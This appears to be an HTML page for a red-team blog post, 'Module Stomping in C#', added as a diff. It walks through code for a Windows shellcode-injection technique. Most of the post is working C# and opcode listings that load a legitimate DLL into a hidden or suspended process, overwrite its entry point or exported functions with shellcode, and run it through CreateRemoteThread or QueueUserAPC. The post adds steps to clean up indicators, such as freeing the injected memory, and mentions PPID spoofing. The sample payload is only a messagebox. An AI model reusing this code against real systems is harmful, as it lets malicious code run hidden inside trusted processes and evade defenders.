@@ -1,0 +1,329 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Module Stomping in C# - Offensive Defence</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.74.2" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://offensivedefence.co.uk/css/main.min.f90f5edd436ec7b74ad05479a05705770306911f721193e7845948fb07fe1335.css" />
+    <script src="https://kit.fontawesome.com/89e1a73a2b.js" crossorigin="anonymous"></script>
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Module Stomping in C#"/>
+<meta name="twitter:description" content="A little while ago I published what I described as a &ldquo;barely functional module stomping in C#&rdquo; proof of concept. It had a couple of (pretty bad) issues - the shellcode would execute multiple times and then crash the host process.
+Ceri took an interest in the code, so we worked together to make it stable and to co-author this blog post.
+What is Module Stomping? Module Stomping (which also seems to go by the names Module Overloading and DLL Hollowing), is a shellcode injection technique that works thusly:"/>
+
+    <meta property="og:title" content="Module Stomping in C#" />
+<meta property="og:description" content="A little while ago I published what I described as a &ldquo;barely functional module stomping in C#&rdquo; proof of concept. It had a couple of (pretty bad) issues - the shellcode would execute multiple times and then crash the host process.
+Ceri took an interest in the code, so we worked together to make it stable and to co-author this blog post.
+What is Module Stomping? Module Stomping (which also seems to go by the names Module Overloading and DLL Hollowing), is a shellcode injection technique that works thusly:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://offensivedefence.co.uk/posts/module-stomping/" />
+<meta property="article:published_time" content="2020-11-20T16:22:10+00:00" />
+<meta property="article:modified_time" content="2020-11-20T16:22:10+00:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://offensivedefence.co.uk"><img class="app-header-avatar" src="/avatar.png" alt="John Doe" /></a>
+      <h1>Offensive Defence</h1>
+      <p>&#34;The hand which strikes also blocks.&#34;</p>
+
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Module Stomping in C#</h1>
+      <div class="post-meta">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-link">
+  <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
+  <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
+</svg>
+              <a class="tag" href="https://offensivedefence.co.uk/authors/rastamouse/">Rasta Mouse</a>
+        
+      
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-link">
+  <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
+  <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
+</svg>
+              <a class="tag" href="https://offensivedefence.co.uk/authors/ccob/">Ethical Chaos</a>
+        
+      
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Nov 20, 2020
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          10 min read
+        </div></div>
+    </header>
+    <div class="post-content">
+      <p>A little while ago I <a href="https://gist.github.com/rasta-mouse/6b3441e35eb1fc3c45907d7e8fb1e5cb/82225ec95baece7e76c0129ff588e06363053387">published</a> what I described as a &ldquo;barely functional module stomping in C#&rdquo; proof of concept.  It had a couple of (pretty bad) issues - the shellcode would execute multiple times and then crash the host process.</p>
+<p><a href="https://twitter.com/_EthicalChaos_">Ceri</a> took an interest in the code, so we worked together to make it stable and to co-author this blog post.</p>
+<h3 id="what-is-module-stomping">What is Module Stomping?</h3>
+<p>Module Stomping (which also seems to go by the names Module Overloading and DLL Hollowing), is a shellcode injection technique that works thusly:</p>
+<ul>
+<li>Create a process or open a handle to an existing process.</li>
+<li>Force that process to load a legitimate DLL from disk.</li>
+<li>Write the shellcode <em>somewhere</em> into the DLL.</li>
+<li>Kick off execution using <code>CreateRemoteThread</code> or other (e.g. <code>UserQueueAPC</code> also works)</li>
+</ul>
+<p>When choosing a DLL to load, the most import aspect to consider is its size.  We can&rsquo;t load a DLL that is smaller than our shellcode, as there won&rsquo;t be enough room in the memory regions allocated to the module.</p>
+<h3 id="lets-go">Let&rsquo;s Go</h3>
+<p>Starting a hidden process is as easy as:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">var</span> process = <span style="color:#66d9ef">new</span> Process
+{
+    StartInfo = <span style="color:#66d9ef">new</span> ProcessStartInfo
+    {
+        FileName = <span style="color:#e6db74">&#34;notepad&#34;</span>,
+        WindowStyle = ProcessWindowStyle.Hidden
+    }
+};
+
+process.Start();
+</code></pre></div><p>Once it&rsquo;s started, the loaded modules can be seen in Process Hacker.</p>
+<p><img src="/images/module-stomping/notepad-default-modules.png" alt="" title="Notepad default loaded modules"></p>
+<h4 id="load-the-dll">Load the DLL</h4>
+<p>This step actually presents an interesting challenge.  The &ldquo;normal&rdquo; way to load a DLL into a remote process may look something like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#75715e">// Module name as byte[]
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> moduleName = Encoding.ASCII.GetBytes(<span style="color:#e6db74">&#34;xpsservices.dll&#34;</span>);
+
+<span style="color:#75715e">// Allocate memory and write module name into remote process
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> alloc = Win32.VirtualAllocEx(process.Handle, IntPtr.Zero, (<span style="color:#66d9ef">uint</span>)moduleName.Length, Win32.AllocationType.Commit, Win32.MemoryProtection.ReadWrite);
+Win32.WriteProcessMemory(process.Handle, alloc, moduleName, (<span style="color:#66d9ef">uint</span>)moduleName.Length, <span style="color:#66d9ef">out</span> UIntPtr _);
+
+<span style="color:#75715e">// Get location of LoadLibraryA in Kernel32
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> kernel = Win32.LoadLibraryEx(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>, IntPtr.Zero, DONT_RESOLVE_DLL_REFERENCES);
+<span style="color:#66d9ef">var</span> loadLibrary = Win32.GetProcAddress(kernel, <span style="color:#e6db74">&#34;LoadLibraryA&#34;</span>);
+
+<span style="color:#75715e">// Call CRT at the location of the modulename and specify the LoadLibrary address as the start routine
+</span><span style="color:#75715e"></span>Win32.CreateRemoteThread(process.Handle, IntPtr.Zero, <span style="color:#ae81ff">0</span>, loadLibrary, alloc, <span style="color:#ae81ff">0</span>, IntPtr.Zero);
+</code></pre></div><p>The problem with this is that <code>LoadLibraryA</code> will call DllMain with the value <code>DLL_PROCESS_ATTACH</code>, and for every thread that is created (and subsequently destroyed), <code>DLL_THREAD_ATTACH</code> and <code>DLL_THREAD_DETACH</code> fire as well.  And since I was writing shellcode over the <code>EntryPointAddress</code> of the module, these constant events were causing the shellcode to execute multiple times.</p>
+<p>(Half) the answer is to use <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryexa">LoadLibraryEx</a> instead.  This API has additional overloads, one of which can be a set of flags that includes <code>DONT_RESOLVE_DLL_REFERENCES</code>.  This tells the system to load the DLL, but <strong>not</strong> process the DLL&rsquo;s import table and <strong>not</strong> to call DllMain.  The difficulty (because there&rsquo;s always a catch) is that we can only provide one argument with <code>CreateRemoteThread</code>, so we can only send the module name to load and nothing more.</p>
+<p>The original thinking was to write a native DLL that would simply call <code>LoadLibraryExA</code> on <code>DLL_PROCESS_ATTACH</code> and inject it into the process.  Injecting the DLL via Process Hacker showed that the module was indeed loaded, but this didn&rsquo;t feel like a good solution.  Because this is such a simple instruction, Ceri had the idea to just hand-write the opcodes required and inject those instead of an entire DLL converted to shellcode.</p>
+<p>The resulting &ldquo;shim&rdquo; comes in at a tiny 18/22 bytes for x86 and x64 respectively.</p>
+<h3 id="the-shim">The Shim</h3>
+<p>If we look at some pseudo high level C# code for our shim, it will give us an idea on what our shellcode will need to do.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C#" data-lang="C#">HMODULE RemoteThreadFunc(<span style="color:#66d9ef">string</span> moduleName){
+    <span style="color:#66d9ef">return</span> LoadLibraryExA(moduleName, <span style="color:#ae81ff">0</span>, DONT_RESOLVE_DLL_REFERENCES);
+}
+</code></pre></div><p>As you can see, it&rsquo;s a pretty simple proxy.  It passes along the argument from our thread function onto the call to <code>LoadLibraryExA</code> module including to constants, 0 and 1 (<code>DONT_RESOLVE_DLL_REFERENCES</code>).  So lets take a look at the x86 version first.</p>
+<h4 id="x86">x86</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#ae81ff">0xAAAAAAAA</span>
+<span style="color:#a6e22e">push</span> <span style="color:#ae81ff">1</span>
+<span style="color:#a6e22e">push</span> <span style="color:#ae81ff">0</span>
+<span style="color:#a6e22e">push</span> [<span style="color:#66d9ef">esp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">12</span>]
+<span style="color:#a6e22e">call</span> <span style="color:#66d9ef">eax</span>
+<span style="color:#a6e22e">ret</span> <span style="color:#ae81ff">12</span>
+</code></pre></div><p>Parameters for the stdcall calling convention on x86 always uses the stack to pass arguments to the callee, but the parameters are pushed in reverse order.  You&rsquo;ll also notice that the 3rd push actually references a pointer that is already on the stack (the address of moduleName parameter).  Typically on the first instruction to any function the first parameter lives at <code>esp+4</code>.  But because we have pushed 2 additional parameters ready to call <code>LoadLibraryExA</code>, the stack pointer would have decremented a further 8 bytes, therefore the pointer to our module name address will be sitting as <code>esp+12</code></p>
+<p>Once the parameters for our call is ready, the assembly code performs an indirect function call using the function address contained in the <code>eax</code> register.  You will notice that the code currently has a place holder of <code>0xAAAAAAAA</code> for the address of <code>LoadLibraryExA</code>.  This will be calculated from the parent process and patched in at runtime.  Finally, once the call completes we return from our shim, but not before adjusting the stack pointer by 12 bytes to satisfy the modifications we ourselves have made to the stack pointer.</p>
+<h4 id="x64">x64</h4>
+<p>When it comes to the x64 assembly we can do things a little differently.  Typically on x64, registers are used for passing the first 4 arguments, specifically <code>RCX</code>, <code>RDX</code>, <code>R8</code> and <code>R9</code>.  There are occasions where other registers are used, for example floating point or other special data types, but for our use case these will be the registers that we are concerned with.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">mov rax, 0xAAAAAAAAAAAAAAAA     # Pointer to LoadLibraryEx
+mov r8, 1                       # DONT_RESOLVE_DLL_REFERENCES
+xor rdx, rdx                    # Less bytes than mov rdx, 0 but same outcome
+jmp rax                         # Pass control to LoadLibraryEx
+</code></pre></div><p>You&rsquo;ll notice that for x64, we only need 4 instructions.  Since we are only manipulating registers and not messing with the stack, we can also immediately jump to LoadLibraryExA instead of making a function call and setting up an additional stack frame.  There is also no need for us to set the RCX register as this will already be pointing to the string containing our module to be stompped over as this is the the first argument to your own little shim.</p>
+<p>So now we just need to put this into a nice helper function that will generate our shellcode on the fly, patching in the address of <code>LoadLibraryExA</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C#" data-lang="C#"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">byte</span>[] GenerateLLExShim(<span style="color:#66d9ef">long</span> loadLibraryExP) {
+
+    MemoryStream ms = <span style="color:#66d9ef">new</span> MemoryStream();
+    BinaryWriter bw = <span style="color:#66d9ef">new</span> BinaryWriter(ms);
+
+    <span style="color:#75715e">//Long winded way of getting bytes as little endian
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (IntPtr.Size == <span style="color:#ae81ff">4</span>) {
+
+        bw.Write((<span style="color:#66d9ef">uint</span>)loadLibraryExP);
+        <span style="color:#66d9ef">byte</span>[] loadLibraryExBytes = ms.ToArray();
+
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[] {
+            <span style="color:#ae81ff">0</span>xB8, loadLibraryExBytes[<span style="color:#ae81ff">0</span>], loadLibraryExBytes[<span style="color:#ae81ff">1</span>], loadLibraryExBytes[<span style="color:#ae81ff">2</span>], loadLibraryExBytes[<span style="color:#ae81ff">3</span>], 
+            <span style="color:#ae81ff">0</span>x6A, <span style="color:#ae81ff">0</span>x01,
+            <span style="color:#ae81ff">0</span>x6A, <span style="color:#ae81ff">0</span>x00,
+            <span style="color:#ae81ff">0</span>xFF, <span style="color:#ae81ff">0</span>x74, <span style="color:#ae81ff">0</span>x24, <span style="color:#ae81ff">0</span>x0c,
+            <span style="color:#ae81ff">0</span>xFF, <span style="color:#ae81ff">0</span>xD0,
+            <span style="color:#ae81ff">0</span>xC2, <span style="color:#ae81ff">0</span>x0C, <span style="color:#ae81ff">0</span>x00
+        };
+
+    } <span style="color:#66d9ef">else</span> {
+
+        bw.Write((<span style="color:#66d9ef">ulong</span>)loadLibraryExP);
+        <span style="color:#66d9ef">byte</span>[] loadLibraryExBytes = ms.ToArray();
+
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[] {
+            <span style="color:#ae81ff">0</span>x48, <span style="color:#ae81ff">0</span>xB8, loadLibraryExBytes[<span style="color:#ae81ff">0</span>], loadLibraryExBytes[<span style="color:#ae81ff">1</span>], loadLibraryExBytes[<span style="color:#ae81ff">2</span>], loadLibraryExBytes[<span style="color:#ae81ff">3</span>], loadLibraryExBytes[<span style="color:#ae81ff">4</span>], loadLibraryExBytes[<span style="color:#ae81ff">5</span>], loadLibraryExBytes[<span style="color:#ae81ff">6</span>],loadLibraryExBytes[<span style="color:#ae81ff">7</span>],
+            <span style="color:#ae81ff">0</span>x49, <span style="color:#ae81ff">0</span>xC7, <span style="color:#ae81ff">0</span>xC0, <span style="color:#ae81ff">0</span>x01, <span style="color:#ae81ff">0</span>x00, <span style="color:#ae81ff">0</span>x00, <span style="color:#ae81ff">0</span>x00,
+            <span style="color:#ae81ff">0</span>x48, <span style="color:#ae81ff">0</span>x31, <span style="color:#ae81ff">0</span>xD2,
+            <span style="color:#ae81ff">0</span>xFF, <span style="color:#ae81ff">0</span>xE0
+        };
+    }
+}
+</code></pre></div><p>Prior to injecting the shellcode we need to allocate some read/execute memory within the process address space for our executable shim, along with some read only memory to hold the string containing the module name to load.  The last phase of the DLL loading step is then to simply kick of a thread within the remote process using the pointer to our allocated shim shellcode and the pointer to the module name as the one and only parameter.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C#" data-lang="C#">Win32.WriteProcessMemory(process.Handle, allocShim, shim, (<span style="color:#66d9ef">uint</span>)shim.Length, <span style="color:#66d9ef">out</span> UIntPtr _);
+Win32.WriteProcessMemory(process.Handle, allocModule, encModuleName, (<span style="color:#66d9ef">uint</span>)encModuleName.Length, <span style="color:#66d9ef">out</span> UIntPtr _);
+<span style="color:#66d9ef">var</span> hThread = Win32.CreateRemoteThread(process.Handle, IntPtr.Zero, <span style="color:#ae81ff">0</span>, allocShim, allocModule, <span style="color:#ae81ff">0</span>, IntPtr.Zero);
+Win32.WaitForSingleObject(hThread, INFINITE);
+</code></pre></div><p>Now we can see <code>xpsservices.dll</code> has been loaded.</p>
+<p><img src="/images/module-stomping/xps-loaded.png" alt="" title="xpsservices.dll loaded"></p>
+<h4 id="injecting-the-shellcode">Injecting the Shellcode</h4>
+<p>Next, we want to write our shellcode somewhere within the memory region(s) assigned to it.  The first attempt was simply to write to the module&rsquo;s <code>BaseAddress</code>, which you can find this C# using the <code>Process</code> class.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#75715e">// Re-fetch the process information
+</span><span style="color:#75715e"></span>process = Process.GetProcessById(process.Id);
+
+IntPtr baseAddress;
+
+<span style="color:#75715e">// Iterate through each ProcessModule
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">foreach</span> (ProcessModule module <span style="color:#66d9ef">in</span> process.Modules)
+{
+    <span style="color:#66d9ef">if</span> (module.ModuleName.Equals(<span style="color:#e6db74">&#34;xpsservices.dll&#34;</span>, StringComparison.OrdinalIgnoreCase))
+    {
+        baseAddress = module.BaseAddress;
+        <span style="color:#66d9ef">break</span>;
+    }
+}
+</code></pre></div><p>This will give us an address like <code>0x7ffd4fcf0000</code>.  Cross-referencing in Process Hacker, it seems to be within this highlighted region.</p>
+<p><img src="/images/module-stomping/base-address.png" alt="" title="xpsservices.dll BaseAddress"></p>
+<p>With the BaseAddress, we can just add a page to get into that main <code>RX</code> region, like:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">baseAddress = module.BaseAddress + <span style="color:#ae81ff">0</span>x1000
+</code></pre></div><p>However, trying to execute shellcode from this location results in a crash thanks to <a href="https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard">Control Flow Guard</a>.</p>
+<h4 id="entrypointaddress">EntryPointAddress</h4>
+<p>The next thought was to find the <code>EntryPointAddress</code> of the module instead - but yet another roadblock, because the DLL was loaded without calling DllMain, the information was just not available in the <code>ProcessModule</code> data:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">module.EntryPointAddress
+0x0000000000000000
+</code></pre></div><blockquote>
+<p>Side note:  For my sanity, I went back and loaded the DLL with <code>LoadLibraryA</code> and the information did appear.</p>
+</blockquote>
+<p>But ok, if we call <code>LoadLibraryA</code> from our <em>current</em> process, we can get the <code>EntryPointAddress</code> that way (as the address will be the same in the target process as it is in our current process).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">Win32.LoadLibraryA(<span style="color:#e6db74">&#34;xpsservices.dll&#34;</span>);
+<span style="color:#66d9ef">var</span> self = Process.GetCurrentProcess();
+
+IntPtr entryPointAddress;
+
+<span style="color:#66d9ef">foreach</span> (ProcessModule module <span style="color:#66d9ef">in</span> self.Modules)
+{
+    <span style="color:#66d9ef">if</span> (module.ModuleName.Equals(<span style="color:#e6db74">&#34;xpsservices.dll&#34;</span>, StringComparison.OrdinalIgnoreCase))
+    {
+        entryPointAddress = module.EntryPointAddress;
+        <span style="color:#66d9ef">break</span>;
+    }
+}
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">module.EntryPointAddress
+0x00007ffd4febf3a0
+</code></pre></div><p>Now if we write some shellcode at this address, we pop a MessageBox!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#75715e">// msfvenom -p windows/messagebox EXITFUNC=thread -f csharp
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> sc = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[<span style="color:#ae81ff">323</span>] {  SNIP };
+
+Win32.WriteProcessMemory(process.Handle, entryPointAddress, sc, (<span style="color:#66d9ef">uint</span>)sc.Length, <span style="color:#66d9ef">out</span> UIntPtr _);
+Win32.CreateRemoteThread(process.Handle, IntPtr.Zero, <span style="color:#ae81ff">0</span>, entryPointAddress, IntPtr.Zero, <span style="color:#ae81ff">0</span>, IntPtr.Zero);
+</code></pre></div><p><img src="/images/module-stomping/msgbox-entry.png" alt="" title="MessageBox at EntryPointAddress"></p>
+<h4 id="exported-functions">Exported Functions</h4>
+<p>If you don&rsquo;t fancy writing over the <code>EntryPointAddress</code>, writing over any of the exported functions is another option.  <code>xpsservices.dll</code> only exports two functions:</p>
+<ul>
+<li><code>DllCanUnloadNow</code></li>
+<li><code>DllGetClassObject</code></li>
+</ul>
+<p>So we could do:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">var</span> xps = Win32.LoadLibraryA(<span style="color:#e6db74">&#34;xpsservices.dll&#34;</span>);
+<span style="color:#66d9ef">var</span> funcAddress = Win32.GetProcAddress(xps, <span style="color:#e6db74">&#34;DllCanUnloadNow&#34;</span>);
+
+<span style="color:#75715e">// [...snip...] //
+</span><span style="color:#75715e"></span>
+Win32.WriteProcessMemory(process.Handle, funcAddress, sc, (<span style="color:#66d9ef">uint</span>)sc.Length, <span style="color:#66d9ef">out</span> UIntPtr _);
+Win32.CreateRemoteThread(process.Handle, IntPtr.Zero, <span style="color:#ae81ff">0</span>, funcAddress, IntPtr.Zero, <span style="color:#ae81ff">0</span>, IntPtr.Zero);
+</code></pre></div><p>Moar boxes be poppin&rsquo; and we can see the thread address is at the exported function.</p>
+<p><img src="/images/module-stomping/msgbox-func.png" alt="" title="MessageBox at Exported Function"></p>
+<h3 id="remote-address-stability">Remote Address Stability</h3>
+<p>When we load <code>xpsservices.dll</code> into our current process and do <code>GetProcAddress</code>, we&rsquo;re making an assumption that the exported function will be at the same address in the remote process.  Although 9/10 times this is probably true, it&rsquo;s not a guarantee.</p>
+<p>So instead of using this address verbatim we can use it to calculate the offset from the module&rsquo;s base address, because this will be the same (assuming we&rsquo;re not injecting into an x64 process from an x86 and vice versa).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#75715e">// Get address of exported function in our process
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> xps = Win32.LoadLibraryExA(<span style="color:#e6db74">&#34;xpsservices.dll&#34;</span>, IntPtr.Zero, DONT_RESOLVE_DLL_REFERENCES);
+<span style="color:#66d9ef">var</span> funcAddress = Win32.GetProcAddress(xps, <span style="color:#e6db74">&#34;DllCanUnloadNow&#34;</span>);
+
+<span style="color:#75715e">// Calculate the offset from the base address and the exported function address
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> funcOffset = (<span style="color:#66d9ef">long</span>)funcAddress - (<span style="color:#66d9ef">long</span>)xps;
+
+<span style="color:#75715e">// Get the target process and iterate through the modules
+</span><span style="color:#75715e"></span>process = Process.GetProcessById(process.Id);
+
+IntPtr remoteFuncAddress;
+
+<span style="color:#66d9ef">foreach</span> (ProcessModule module <span style="color:#66d9ef">in</span> process.Modules)
+{
+    <span style="color:#66d9ef">if</span> (module.ModuleName.Equals(<span style="color:#e6db74">&#34;xpsservices.dll&#34;</span>, StringComparison.OrdinalIgnoreCase))
+    {
+        <span style="color:#75715e">// Get the module&#39;s base address and add our calculated offset to it
+</span><span style="color:#75715e"></span>        remoteFuncAddress = <span style="color:#66d9ef">new</span> IntPtr((<span style="color:#66d9ef">long</span>)module.BaseAddress + funcOffset);
+        <span style="color:#66d9ef">break</span>;
+    }
+}
+</code></pre></div><p>Hopefully this will help address (no pun intended) those edge cases.</p>
+<h3 id="wrapping-up">Wrapping Up</h3>
+<p>Now that we have a reliable way to load the desired DLL, find a memory location to write to and execute shellcode, let&rsquo;s see if there&rsquo;s anything we can do to tidy up some of the other indicators.</p>
+<p>Some questions I had in my mind were:</p>
+<ul>
+<li>Can we free the memory regions in the remote process containing the string &ldquo;xpsservices.dll&rdquo; and the shim shellcode?</li>
+<li>Can we use something other than <code>CreateRemoteThread</code> to trigger execution?</li>
+</ul>
+<h4 id="virtualfreeex">VirtualFreeEx</h4>
+<p>Freeing the memory regions is easy to do with the <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualfreeex">VirtualFreeEx</a> API.</p>
+<p>Conveniently we only need to provide the base address returned by <code>VirtualAllocEx</code> without having to worry about the region size.  The API will take care of everything.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">Win32.VirtualFreeEx(process.Handle, allocModule, <span style="color:#ae81ff">0</span>, Win32.AllocationType.Release);
+</code></pre></div><p>This screenshot shows one of these regions that will be freed.</p>
+<p><img src="/images/module-stomping/virtualfree.png" alt="" title="Region to be freed"></p>
+<h4 id="queueuserapc">QueueUserAPC</h4>
+<p>Replacing the process startup code with the <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa">CreateProcessA</a> API allows us to do a few additional things - namely start it in a suspended state, PPID spoof and add a process mitigation policy (ala BlockDLLs).  It also gives us an easy handle to the main thread.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#75715e">// Start notepad in a suspended state
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> si = <span style="color:#66d9ef">new</span> Win32.STARTUPINFO();
+si.cb = Marshal.SizeOf(si);
+si.dwFlags = STARTF_USESHOWWINDOW;
+
+<span style="color:#66d9ef">var</span> pa = <span style="color:#66d9ef">new</span> Win32.SECURITY_ATTRIBUTES();
+<span style="color:#66d9ef">var</span> ta = <span style="color:#66d9ef">new</span> Win32.SECURITY_ATTRIBUTES();
+
+Win32.CreateProcess(
+    <span style="color:#66d9ef">null</span>,
+    <span style="color:#e6db74">&#34;notepad&#34;</span>,
+    <span style="color:#66d9ef">ref</span> pa,
+    <span style="color:#66d9ef">ref</span> ta,
+    <span style="color:#66d9ef">false</span>,
+    CREATE_SUSPENDED,
+    IntPtr.Zero,
+    <span style="color:#66d9ef">null</span>,
+    <span style="color:#66d9ef">ref</span> si,
+    <span style="color:#66d9ef">out</span> Win32.PROCESS_INFORMATION pi);
+
+<span style="color:#75715e">// [...snip...] //
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">// Write shellcode into module
+</span><span style="color:#75715e"></span>Win32.WriteProcessMemory(pi.hProcess, remoteFuncAddress, sc, (<span style="color:#66d9ef">uint</span>)sc.Length, <span style="color:#66d9ef">out</span> UIntPtr _);
+
+<span style="color:#75715e">// Queue the APC call
+</span><span style="color:#75715e"></span>Win32.QueueUserAPC(remoteFuncAddress, pi.hThread, IntPtr.Zero);
+
+<span style="color:#75715e">// Result the main thread
+</span><span style="color:#75715e"></span>Win32.ResumeThread(pi.hThread);
+
+</code></pre></div><h3 id="final-code">Final Code</h3>
+<p>This is the final code as far as this post goes. There are a few changes / improvements / experiments that I may come back to in the future such as replacing the PInvoke with syscalls, but I think this post is long enough for now :)</p>
+<script src="https://gist.github.com/rasta-mouse/bd828418d804e5550219c6dc1857f0fa.js"></script>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
